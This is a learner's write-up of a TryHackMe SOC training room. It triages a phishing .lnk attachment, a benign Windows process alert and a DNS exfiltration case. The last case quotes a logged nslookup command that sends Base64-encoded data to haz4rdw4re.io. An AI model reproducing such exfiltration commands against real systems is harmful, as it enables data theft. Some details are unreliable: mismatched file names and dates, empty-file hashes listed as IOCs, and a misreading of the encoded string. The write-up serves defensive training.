\# TryHackMe Room: Phishing Unfolding



This room offered a unique experience, allowing me to step into a Security Operations Center (SOC) analyst role. The challenge was a simulated SOC task where I had to triage and respond to various alerts, analyzing log data and classifying incidents.



---



\## Alert ID: 1007 (Phishing Email)



\### Details



Description: A suspicious attachment was found in the email. Investigate further to determine if it is malicious.

datasource: emails

timestamp: 06/17/2025 18:54:23.629

subject: Important: Pending Invioce!

sender: john@hatmakereurope.xyz

recipient: michael.ascot@tryhatme.com

attachment: ImportantInvoice-Febrary.zip

content: The content of this email has been removed in accordance with privacy regulations and company security policies to protect sensitive information.

direction: inbound



My first step was to check the sender's domain reputation. I used a tool like TryDetectThis to perform a quick check.



\[Screenshot 01: TryDetectThis reputation](./screenshots/01-trydetectthis.png)



The domain hatmakereurope.xyz appeared to have a good reputation. However, this didn't rule out a spoofed or compromised account. My next step was to investigate the recipient, Michael Ascot, in the SIEM to see if they had clicked on anything. The host ID for this user was 3450.



By analyzing the logs, I found a File Stream Created event associated with the email attachment. The file name was invoice.pdf.lnk. This was a significant red flag. The file was disguised as a PDF but was a .lnk file (a program shortcut), which is a common method for delivering malware.



\[Screenshot 02: File Stream Created log](./screenshots/02-file-stream-created.png)



I then submitted the malicious file for analysis.



\[Screenshot 03: File analysis result](./screenshots/03-file-analysis.png)



The analysis confirmed that the file was indeed malicious. Based on these findings, I wrote a report.



Report

Incident Classification: True Positive



Report Details



Time of Activity: June 17, 2025, 18:54:23.629



List of Affected Entities:



Recipient Email: michael.ascot@tryhatme.com



Email File: Important: Pending Invioce!



Attachment: ImportantInvoice-Febrary.zip



Malicious File: invioce.pdf.lnk



Reason for Classifying as True Positive:



File analysis confirmed that the attachment, named invioce.pdf.lnk, is malicious.



Despite the sender's domain having a seemingly good reputation, the presence of a malicious file confirms this is a genuine security incident, not a false alarm.



Files with the .lnk extension (program shortcuts) are commonly used in phishing attacks to execute malicious code.



Reason for Escalating the Alert:



This incident requires escalation because a malicious file was delivered and likely executed on an employee's machine.



Although the alert had a low severity, the confirmed malicious nature of the attachment means the threat is real and requires immediate action to prevent further damage.



Recommended Remediation Actions:



Isolate and Quarantine: Isolate the malicious email and its attachments.



Block Indicators of Attack (IOCs): Block the sender's email address and the file hashes of the malicious file on all email gateways and security systems.



Endpoint Scan: Perform a full scan of Michael Ascot's device to check for any malware that may have been downloaded or executed.



User Notification: Inform the user, Michael Ascot, about the incident and provide a brief security awareness training session.



List of Attack Indicators (IOCs):



Sender Email: john@hatmakereurope.xyz



File Name: invioce.pdf.lnk



File Hashes:



MD5: d41d8cd98f00b204e9800998ecf8427e



SHA-1: da39a3ee5e6b4b0d3255bfef95601890afd80709



SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855



Does this alert require escalation? Yes



---



\## Alert ID: 1016 (Process Create)



\### Details



Description: A suspicious process with an uncommon parent-child relationship was detected in your environment.

datasource: sysmon

timestamp: 09/12/2025 13:47:53.037

event.code: 1

host.name:

process.name: TrustedInstaller.exe

process.pid: 3817

process.parent.pid: 3922

process.parent.name: services.exe

process.command\_line: C:\\Windows\\servicing\\TrustedInstaller.exe

process.working\_directory: C:\\Windows\\system32\\

event.action: Process Create (rule: ProcessCreate)



Upon initial review, the parent-child relationship between services.exe and TrustedInstaller.exe seemed normal. I checked the SIEM for any other events related to this alert, but none were present. Based on the standard behavior of these Windows processes, I concluded that this was a false alarm.



Report

Incident Classification: False Positive



Report Details



Time of Activity: September 12, 2025, 13:47:53.037



List of Related Entities:



Hostname: (not specified in the alert)



Parent Process: services.exe (PID: 3922)



Child Process: TrustedInstaller.exe (PID: 3817)



Reason for Classifying as False Positive:



Legitimate System Processes: Both services.exe and TrustedInstaller.exe are standard and essential components of the Windows operating system. services.exe is the Service Control Manager, and TrustedInstaller.exe is responsible for installing and modifying system files.



Expected Parent-Child Relationship: The relationship where services.exe launches TrustedInstaller.exe is a typical and common occurrence during normal system operations. Although the alert description mentions an "uncommon parent-child relationship," this specific interaction is expected behavior.



Standard File Paths: The file paths (C:\\Windows\\servicing\\TrustedInstaller.exe) and working directory (C:\\Windows\\system32) are standard for these processes, further confirming their legitimacy.



---



\## Alert ID: 1036 (High Severity)



\### Details



Datasource: Sysmon

Timestamp: 28/12/2024 11:47:56.301

Event Code: 1 (Process Creation)

Host Name: win-3450

Process Name: nslookup.exe

Process PID: 3648

Parent Process PID: 3728

Parent Process Name: powershell.exe

Command Line: "C:\\Windows\\system32\\nslookup.exe" RmJjEyNGZiMTY1NjZlFQ==.haz4rdw4re.io

Working Directory: C:\\Users\\michael.ascot\\downloads

Event Action: Process Create (rule: ProcessCreate)



The parent-child relationship of powershell.exe spawning nslookup.exe is highly suspicious, especially when the user is the company's CEO. The command line was an immediate red flag, as it contained a Base64-encoded string and a malicious-looking domain: haz4rdw4re.io. This strongly suggested Command and Control (C2) activity.



I immediately filtered the SIEM logs to investigate the user's recent events. The logs showed numerous nslookup.exe events from the same user within a very short timeframe (just 16 seconds), which indicated automated data exfiltration. The working directory, C:\\Users\\michael.ascot\\downloads\\exfiltration, further confirmed that sensitive or unauthorized data was being collected and exfiltrated. The encoded string was likely the C2 server address for this process.



\[Screenshot 04: nslookup.exe log in SIEM](./screenshots/04-nslookup-log.png)



With strong evidence of a C2 connection and data exfiltration, I prepared a report.



Report

Incident Classification: True Positive



Report Details



Time of Activity:



Start: September 12, 2025, 13:59:22.037



End: September 12, 2025, 13:59:38.037



List of Affected Entities:



Hostname: win-3450



User: michael.ascot (CEO)



Parent Process: powershell.exe (PID: 3728)



Child Process: nslookup.exe (PID: 3648)



Suspicious Domain: haz4rdw4re.io



Working Directory: C:\\Users\\michael.ascot\\downloads\\exfiltration\\



Reason for Classifying as True Positive:



A high-severity alert was triggered by an unusual parent-child process relationship (powershell.exe launching nslookup.exe).



The command line of the nslookup process contained an encoded Base64 string and a highly suspicious domain, which is a strong indicator of Command and Control (C2) activity.



Multiple nslookup.exe events were logged in a very short time frame (16 seconds), indicating automated data exfiltration.



The working directory path (C:\\Users\\michael.ascot\\downloads\\exfiltration) further suggests the collection and exfiltration of sensitive data.



Reason for Escalating the Alert:



This incident is a confirmed true positive involving a sophisticated attack method (C2 communication via DNS).



The affected user is the CEO of the company, which makes this a high-priority incident due to the potential for significant data loss or compromise.



The attacker has likely gained unauthorized access and is actively exfiltrating data, requiring an immediate and coordinated response.



Recommended Remediation Actions:



Isolate Host: Immediately isolate the win-3450 host from the network to prevent further data exfiltration or lateral movement.



Account Lockout: Temporarily suspend or reset the credentials of the affected user (michael.ascot).



Incident Response: Initiate the full incident response process, including a forensic analysis of the affected host to determine the initial access vector, the extent of the compromise, and any other affected systems.



Blocking Indicators of Attack (IOCs): Block the malicious domain (haz4rdw4re.io) and other related IOCs at the DNS level and on all security appliances.



List of Attack Indicators (IOCs):



Malicious Domain: haz4rdw4re.io



Parent Process: powershell.exe



Child Process: nslookup.exe



Working Directory: C:\\Users\\michael.ascot\\downloads\\exfiltration\\



Command Line: "C:\\Windows\\system32\\nslookup.exe" RmJjEyNGZiMTY1NjZlFQ==.haz4rdw4re.io



Does this alert require escalation? Yes



---



\## Summary

This room was a highly practical exercise in Security Operations. I practiced key SOC analyst skills, including:



Alert Triage: Analyzing initial alert details to determine if an incident is a genuine threat.



Log Analysis: Investigating events in a SIEM to find indicators of compromise (IOCs) and understand the full scope of an attack.



Incident Classification: Accurately labeling alerts as True Positive or False Positive based on evidence.



Reporting: Documenting findings in a structured report that provides clear details, reasoning, and recommended actions for an incident response team.



